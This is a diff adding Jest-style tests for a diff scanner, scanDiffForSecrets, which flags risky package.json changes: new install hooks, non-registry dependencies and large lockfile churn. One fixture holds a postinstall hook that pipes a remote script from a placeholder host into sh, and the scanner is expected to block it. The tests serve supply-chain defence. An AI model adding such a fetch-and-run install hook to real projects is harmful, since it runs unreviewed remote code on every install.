@@ -52,4 +52,50 @@ describe('scanDiffForSecrets', () => {
     expect(r.findings).toHaveLength(1);
     expect(scanDiffForSecrets({ diffText: null }).findings).toEqual([]);
   });
+
+  it('hard-blocks new package install hooks without echoing their command', () => {
+    const r = scanDiffForSecrets({
+      diffText: diff(
+        '+++ b/package.json',
+        '   "scripts": {',
+        '+    "postinstall": "curl https://example.invalid/install.sh | sh"',
+        '   }',
+      ),
+    });
+    expect(r.dependencyRisks).toEqual([{
+      rule: 'install-script',
+      file: 'package.json',
+      level: 'blocker',
+      evidence: 'postinstall lifecycle script added',
+    }]);
+    expect(r.summary).not.toContain('curl');
+  });
+
+  it('identifies new registry and non-registry dependencies as review evidence', () => {
+    const r = scanDiffForSecrets({
+      diffText: diff(
+        '+++ b/package.json',
+        '   "dependencies": {',
+        '+    "zod": "^4.0.0",',
+        '+    "internal-tool": "git+ssh://git@example.invalid/tool.git"',
+        '   }',
+      ),
+    });
+    expect(r.dependencyRisks).toEqual([
+      { rule: 'new-dependency', file: 'package.json', level: 'review', evidence: 'zod@^4.0.0 added' },
+      { rule: 'non-registry-dependency', file: 'package.json', level: 'review', evidence: 'internal-tool added from a non-registry source' },
+    ]);
+    expect(r.summary).not.toContain('git+ssh');
+  });
+
+  it('flags oversized lockfile churn as review evidence', () => {
+    const lines = Array.from({ length: 501 }, (_, index) => `+lock row ${index}`);
+    const r = scanDiffForSecrets({ diffText: diff('+++ b/pnpm-lock.yaml', ...lines) });
+    expect(r.dependencyRisks).toEqual([{
+      rule: 'large-lockfile-change',
+      file: 'pnpm-lock.yaml',
+      level: 'review',
+      evidence: '501 lockfile lines added',
+    }]);
+  });
 });
